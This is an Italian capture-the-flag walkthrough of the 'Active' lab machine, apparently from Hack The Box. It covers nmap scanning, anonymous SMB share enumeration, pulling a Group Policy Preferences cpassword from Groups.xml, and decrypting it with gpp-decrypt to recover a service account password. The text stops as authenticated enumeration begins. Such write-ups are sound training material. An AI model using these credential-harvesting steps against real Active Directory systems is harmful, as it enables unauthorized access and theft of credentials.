---
title: Active Walkthrough
description: "Active è una macchina di difficoltà da easy a medium, che presenta due tecniche molto diffuse per ottenere privilegi all'interno di un ambiente Active Directory."
author: dua2z3rr
date: 2025-12-06 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Enterprise Network", "Area di Interesse: Vulnerability Assessment", "Area di Interesse: Active Directory", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Security Tools", "Area di Interesse: Authentication", "Vulnerabilità: Default Credentials", "Vulnerabilità: Weak Permissions", "Vulnerabilità: Anonymous/Guest Access", "Servizio: SMB", "Servizio: Kerberos", "Tecnica: Reconnaissance", "Tecnica: Password Cracking", "Tecnica: Kerberoasting"]
image: /assets/img/active/active-resized.png
---

## Enumerazione Esterna

### nmap

Facciamo uno scan nmap.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.100 -vv -A
<SNIP>
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-12-05 11:35:32Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack Microsoft Windows RPC
49167/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.100 -vv -p53,88,135,139,389,445,464,593,636,3268,3269,49152-49158,49165,49167 -sC -sV
<SNIP>
PORT      STATE    SERVICE       REASON       VERSION
53/tcp    open     domain        syn-ack      Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open     kerberos-sec  syn-ack      Microsoft Windows Kerberos (server time: 2025-12-05 11:40:47Z)
135/tcp   open     msrpc         syn-ack      Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack      Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack
464/tcp   open     kpasswd5?     syn-ack
593/tcp   open     ncacn_http    syn-ack      Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped    syn-ack
3268/tcp  open     ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped    syn-ack
49152/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49153/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49154/tcp filtered unknown       no-response
49155/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49156/tcp closed   unknown       conn-refused
49157/tcp open     ncacn_http    syn-ack      Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49165/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49167/tcp open     msrpc         syn-ack      Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-05T11:41:45
|_  start_date: 2025-12-05T11:20:16
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35056/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38631/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25865/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

### SMB

Enumeriamo gl shares di smb con smbmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

Abbiamo il permesso **READ ONLY** per lo share **Replication**. Scarichiamo tutti i file.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $smbclient //10.10.10.100/Replication
Password for [WORKGROUP\dua2z3rr]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0,1 KiloBytes/sec) (average 0,0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0,2 KiloBytes/sec) (average 0,1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (6,7 KiloBytes/sec) (average 1,3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1,0 KiloBytes/sec) (average 1,2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3,2 KiloBytes/sec) (average 1,5 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (8,1 KiloBytes/sec) (average 2,3 KiloBytes/sec)
```

Lo share sembra una replica dello share di default **SYSVOL**, il quae contiene GPO (Group Policy Objects) ed è accessibile da tutti gli utenti autenticati. Leggo il file xml, il quale è l'unico leggibile.

```xml
┌─[dua2z3rr@parrot]─[~]
└──╼ $cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

All'interno di questo file troviamo la password criptata dell'utente **SVC_TGS**, il quale fa intendere che è un utente associato a kerberos (Ticket Granting Service).

### Decript

Cerando il tipo di hash con hashid, non otteniamo nulla. Dunque, dobbiamo ricercare come decriptarla.

Possiamo cercare come funziona la **Group Policy Password (GPP) encryption**.

Group Policy Preferences (GPP) è una funzionalità di Windows che consente agli amministratori di gestire le impostazioni su più macchine in un ambiente Active Directory (AD). Una delle sue funzionalità era quella di impostare password per account locali, che vengono memorizzate in file XML all'interno della directory SYSVOL.
Metodo di Cifratura

Tipo di Cifratura: Le password GPP sono cifrate utilizzando AES (Advanced Encryption Standard).
Divulgazione della Chiave: La chiave di cifratura è pubblicamente nota, rendendo relativamente semplice per gli attaccanti decifrare le password.

Posso usare il tool **gpp-decrypt** di kali linux per decryptarla.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

La password dell'utente **SVC_TGS** è **GPPstillStandingStrong2k18**.

### SMB Autenticato

Ora che abbiamo delle credenziali, non possiamo connetterci in rdp o winrm poichè le porte non sono aperte. quindi, enumeriamo smb da auten